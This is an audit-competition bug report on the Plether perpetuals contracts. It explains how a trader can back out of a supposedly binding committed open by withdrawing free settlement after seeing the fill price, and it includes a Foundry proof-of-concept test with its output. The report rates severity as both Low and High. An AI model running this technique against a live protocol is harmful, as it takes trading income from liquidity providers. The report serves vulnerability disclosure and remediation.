# \#99028 [SC-Low] A trader can cancel its own committed open after seeing the price by withdrawing free settlement

**Submitted on Nov 11th 2026 at 14:05:03 UTC by @xKeywordx for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99028
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Theft of unclaimed yield
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

## Description

Plether uses delayed orders so that traders cannot trade on prices they have already seen. A trader commits an order, and a keeper later fills it at the first Pyth price published after the commit. The protocol relies on that order being binding: once committed, the trader cannot cancel it.

A trader can still cancel a committed open in practice. When an open reduces the market's skew, it earns a VPI rebate, and the protocol holds that rebate in a reserve the trader cannot withdraw. At execution, the protocol funds this reserve from the trader's free (unreserved) settlement first, and takes only the rest from the margin the order brought. The commit does not lock that free settlement, and a withdrawal does not check pending orders unless the order opted into a settlement floor. A trader who commits such an open with just enough margin to pass the initial-margin check therefore keeps the power to make it fail: withdrawing the free settlement moves part of the reserve onto the order's margin, the margin falls below the requirement, and the keeper's execution fails with `INSUFFICIENT_INITIAL_MARGIN`. The trader gets its margin back and loses only the execution bounty.

This allows any trader to do the following:

1. Commit an open that reduces skew, with just enough margin to pass the initial margin check, and keep some free settlement in the account.
2. Watch the price after the fill tick is published.
3. If the price moves in its favour, do nothing: the keeper fills the open at the fill tick.
4. If the price moves against it before a keeper executes the order, withdraw the free settlement. The open fails and the margin is returned.

In the POC below, Bob holds a 1M USDG LONG and Alice commits a 500k USDG SHORT with 1,600 USDG of margin. Her initial margin requirement is 1,000 USDG, her liquidation reserve 500 USDG and her VPI rebate reserve 749.55 USDG. With her free settlement in place, the whole rebate reserve comes from free settlement and her margin after the open is 1,100 USDG, above the requirement. After she withdraws her 8,399.80 USDG of free settlement, 200 USDG of the reserve comes from her margin instead, which drops to 900 USDG, and the open fails. From the same committed state:

| Price after the fill tick | Alice's result if the order is binding | Alice's result with the self-cancel |
| ------------------------- | -------------------------------------- | ----------------------------------- |
| 40 bps against her        | -1,499.40 USDG                         | -0.20 USDG (she cancels)            |
| 40 bps in her favour      | +1,592.88 USDG                         | +1,592.88 USDG (she keeps the fill) |

The POC uses the release parameters from `packages/perps/DEPLOYMENT.md` (0.1%/0.2% margins, 0.04% execution fee, vpiFactor 0.01e18, 0.10% liquidation charge with a 50% keeper share). Prices come from the suite's mock Pyth with zero confidence, so no adverse confidence shift applies to either path.

**This issue was reported in a previous audit, and its fix is incomplete.** SC Audit Studio's pre-audit reported this free option as SC-M4 ("Risk Free Option in 60Sec Oracle Window"), with the response "Fixed in Plether-Fi/plether-core#24". Its third component, "LP Order Cancellation", let the attacker "trigger a full margin refund on the losing order" after "determining the profitable direction": it withdrew LP funds so that the losing order failed with `SOLVENCY_EXCEEDED` and returned the margin. At this commit a keeper can no longer choose the price: the fill is the first Pyth update after the commit, and execution cannot happen in the commit block. But a losing order can still be refunded after the price is known. The trader now makes it fail through its own free settlement instead of the LP depth. The competition rules make this report eligible: "For findings marked as fixed or Acknowledged in the reports above, a report on the same root cause is valid only if it shows that the fix at commit a82d4fefb02768e5b3bddcc97dee371eee24fea8 is incomplete or introduces a new bug." This report shows that the fix is incomplete.

**When this pays.** The cancel is a simple withdrawal: it needs a fresh engine mark (`CfdEngineSettlementSidecar.sol:278-281`) but no new Pyth update, while a keeper must first obtain the fill update from Pyth before it can execute. A trader can therefore land the withdrawal faster than the keeper's execution.

## Root cause

The commit reserves the order's margin and bounty, but not the free settlement the open needs at execution, and nothing stops the trader from removing that free settlement while the order is pending.

`CfdEnginePlanLib._planOpenReserveFunding` funds the VPI rebate reserve from free settlement first and takes the rest from the order's margin (lines 564-567 and 578-579):

```solidity
        uint256 vpiReserveFromFreeAssets = vpiReserveIncreaseAssets < openCostPlan.resultingFreeSettlementAssets
            ? vpiReserveIncreaseAssets
            : openCostPlan.resultingFreeSettlementAssets;
        delta.vpiRebateReserveFromPledgeAssets = vpiReserveIncreaseAssets - vpiReserveFromFreeAssets;
        ...
        delta.positionMarginAfterOpen =
            openCostPlan.resultingPositionMarginAssets - delta.vpiRebateReserveFromPledgeAssets - reserveIncreaseAssets;
```

The smaller margin then fails the initial-margin check in `planOpen` (lines 430-436):

```solidity
        if (
            postOpenRiskState.liquidatable
                || postOpenRiskState.equityAssets <= int256(openState.initialMarginRequirementAssets)
        ) {
            delta.revertCode = CfdEnginePlanTypes.OpenRevertCode.INSUFFICIENT_INITIAL_MARGIN;
            return delta;
```

`CfdEngineSettlementSidecar.validateWithdraw` (lines 255-285) lets an account with no open position withdraw free settlement while an open is pending. Its only pending-order check is the optional settlement floor, which applies only if the order set a non-zero `minPostSettlementBalanceAssets`:

```solidity
        if (pos.size == 0) {
            (uint64 orderId, uint256 minimum, uint256 maxDebit) =
                OrderSettlementFloorLib.load(engine.orderRouter(), account);
            if (minimum != 0) {
```

The failure is a `UserInvalid` typed failure, so the router finalizes the order, releases the margin and pays the keeper only the execution bounty (0.20 USDG in the POC).

The trader can see the price before acting. The fill price is the first Pyth update after the commit (`PletherOracle.sol:610-614`, `minPublishTime = request.commitTime + 1`), and the only timing checks at execution are a later block and an update newer than the commit (`OrderRouterExecutionSidecar.sol:445-452`).

## Impact

**High: Theft of unclaimed yield.**

- Yield loss: LPs are the counterparty to every trade, so a trader's loss is LP income. With the self cancel, a trader keeps the commits that move in its favour and cancels the ones that move against it. LPs pay out on the winning trades but never collect on the losing ones. In the POC, a 40 bps adverse move costs Alice 1,499.40 USDG when the order is binding (paid to the LPs, and the execution fees to the treasury), but only 0.20 USDG with the self cancel. Any trader can repeat this on every skew-reducing open. LP deposits are not reduced; what is taken is the trading income LPs earn when a committed open moves against the trader.

Additional context about why this is a new issue and not a duplicate based on previous reports and this Audit Comp rules

**Broken promises and assumptions:**

- The protocol promises that committed orders cannot be cancelled. `SECURITY.md:366`: "| Binding intents | Users cannot cancel queued orders once committed |". `ACCOUNTING_SPEC.md:1266`: "Users cannot cancel a binding ordinary order." `CANONICAL_ENTRYPOINTS.md:43`: "committed orders remain user-uncancellable." Withdrawing the free settlement that the open needs is a cancel in all but name, and it can be done after the fill price is known.
- Previous audit: SC-M4 reported the same root cause (refunding a losing order after the price is known) and is marked Fixed. As shown in the Description, the fix is incomplete, which the competition rules accept as a valid report.
- The Known Limitations do not cover it. `SECURITY.md:1345` lists "users cannot manually cancel queued intents" as a property, which this report shows does not hold. HIGH-1 (Arbitrum and Pyth clock alignment) is about committing after a price is published; this report is about backing out after the commit, whenever the commit was made.

## Recommended mitigation

Lock at commit the free settlement that an open will need at execution (the part of the VPI rebate reserve funded from free settlement), or fund that reserve only from the order's own margin. Alternatively, apply the settlement-floor check in `validateWithdraw` to every account with a pending open, not only to orders that opt in, so free settlement a pending open depends on cannot be removed.

## Proof of Concept

## Proof of Concept

Paste the following contract at the bottom of the existing `packages/perps/test/perps/spec/trader/PositionAdmissionBehavior.t.sol`. It only uses that file's imports and the `BasePerpTest` helpers. `_open` (a `BasePerpTest` helper that calls the engine as the Router) only sets up Bob's position; Alice's commit, her withdrawal and the keeper's executions are normal calls. The five-argument `router.commitOrder(side, size, margin, 0, isClose)` is the suite's `LegacyOrderRouterHarness` shorthand for the production V3 commit with no price or fee limits. Run it from `packages/perps`:

```solidity
/// @notice PoC (SC-M4 residual): a trader cancels its own committed ("binding") open after seeing the price by
///         withdrawing the unreserved free settlement that the open's VPI rebate reserve needs at execution.
contract CommittedOpenSelfCancelTest is BasePerpTest {

    address internal constant TRADER = address(0xA71CE);
    address internal constant BOOK_LONG = address(0xB0B0);
    address internal constant KEEPER = address(0x4EE9E4);

    uint256 internal constant SIZE = 500_000e18; // 500k USDG notional at $1.00
    uint256 internal constant MARGIN = 1_600e6; // enough only while free settlement funds part of the rebate reserve

    /// @dev Release risk parameters (DEPLOYMENT.md).
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 5_000_000e6;
    }

    function _traderAssets() internal view returns (uint256) {
        return clearinghouse.balanceAssets(TRADER) + settlementToken.balanceOf(TRADER)
            + engine.traderClaimBalanceAssets(TRADER);
    }

    function _sizeOf(
        address account
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    function _closeAt(
        uint256 price
    ) internal {
        vm.prank(TRADER);
        uint64 closeId = router.commitOrder(CfdTypes.Side.SHORT, SIZE, 0, 0, true);
        bytes[] memory tick = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        router.executeOrder(closeId, tick);
        assertEq(_sizeOf(TRADER), 0, "closed");
    }

    function test_TraderCancelsCommittedOpenAfterSeeingPrice() public {
        assertFalse(engine.isFadWindow(), "live market");
        // Existing LONG skew: the trader's SHORT reduces skew and earns a VPI rebate that must sit in a reserve.
        _fundTrader(BOOK_LONG, 100_000e6);
        _open(BOOK_LONG, CfdTypes.Side.LONG, 1_000_000e18, 50_000e6, 1e8);
        _fundTrader(TRADER, 10_000e6);
        uint256 start = _traderAssets();

        // The trader commits a binding SHORT open with a tight margin.
        vm.prank(TRADER);
        uint64 openId = router.commitOrder(CfdTypes.Side.SHORT, SIZE, MARGIN, 0, false);
        uint256 freeAfterCommit = _freeSettlementAssets(TRADER);
        uint256 snap = vm.snapshotState();

        // EXPECTED (binding intent): the keeper fills the open at the first post-commit tick ($1.00); the basket then
        // falls 40 bps, which is adverse for this SHORT, and the trader closes.
        bytes[] memory fillTick = _mockPythUpdateData(1e8);
        vm.prank(KEEPER);
        router.executeOrder(openId, fillTick);
        assertEq(_sizeOf(TRADER), SIZE, "binding open fills");
        _closeAt(0.996e8);
        int256 resultWhenBound = int256(_traderAssets()) - int256(start);
        vm.revertToState(snap);

        // FAVOURABLE CONTROL: same fill, the basket rises 40 bps, the trader keeps the fill and closes.
        fillTick = _mockPythUpdateData(1e8);
        vm.prank(KEEPER);
        router.executeOrder(openId, fillTick);
        _closeAt(1.004e8);
        int256 resultWhenKept = int256(_traderAssets()) - int256(start);
        vm.revertToState(snap);

        // ATTACK: the trader sees the adverse move before a keeper executes and withdraws its free settlement.
        vm.prank(TRADER);
        clearinghouse.withdraw(TRADER, freeAfterCommit);
        fillTick = _mockPythUpdateData(1e8);
        vm.prank(KEEPER);
        router.executeOrder(openId, fillTick);
        assertEq(_sizeOf(TRADER), 0, "the committed open did not fill");
        int256 resultWhenCancelled = int256(_traderAssets()) - int256(start);

        emit log_named_uint("free settlement withdrawn after commit (USDG 6dp)", freeAfterCommit);
        emit log_named_int("EXPECTED  trader result, fill then adverse 40 bps move  ", resultWhenBound);
        emit log_named_int("CONTROL   trader result, fill then favourable 40 bps  ", resultWhenKept);
        emit log_named_int("ATTACK    trader result, open cancelled by withdrawal ", resultWhenCancelled);
        assertEq(clearinghouse.lockedMarginAssets(TRADER), 0, "order finalized: margin and bounty reservation released");
        assertGt(resultWhenCancelled, -1e6, "cancelling costs less than 1 USDG");
        assertGt(resultWhenCancelled, resultWhenBound, "cancelling beats the binding fill");
    }

}
```

Test output

```solidity
forge test --mt test_TraderCancelsCommittedOpenAfterSeeingPrice -vv
[⠒] Compiling...
No files changed, compilation skipped

Ran 1 test for test/perps/spec/trader/PositionAdmissionBehavior.t.sol:CommittedOpenSelfCancelTest
[PASS] test_TraderCancelsCommittedOpenAfterSeeingPrice() (gas: 8611552)
Logs:
  free settlement withdrawn after commit (USDG 6dp): 8399800000
  EXPECTED  trader result, fill then adverse 40 bps move  : -1499400000
  CONTROL   trader result, fill then favourable 40 bps  : 1592878312
  ATTACK    trader result, open cancelled by withdrawal : -200000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 20.31ms (13.21ms CPU time)
Ran 1 test suite in 69.45ms (20.31ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
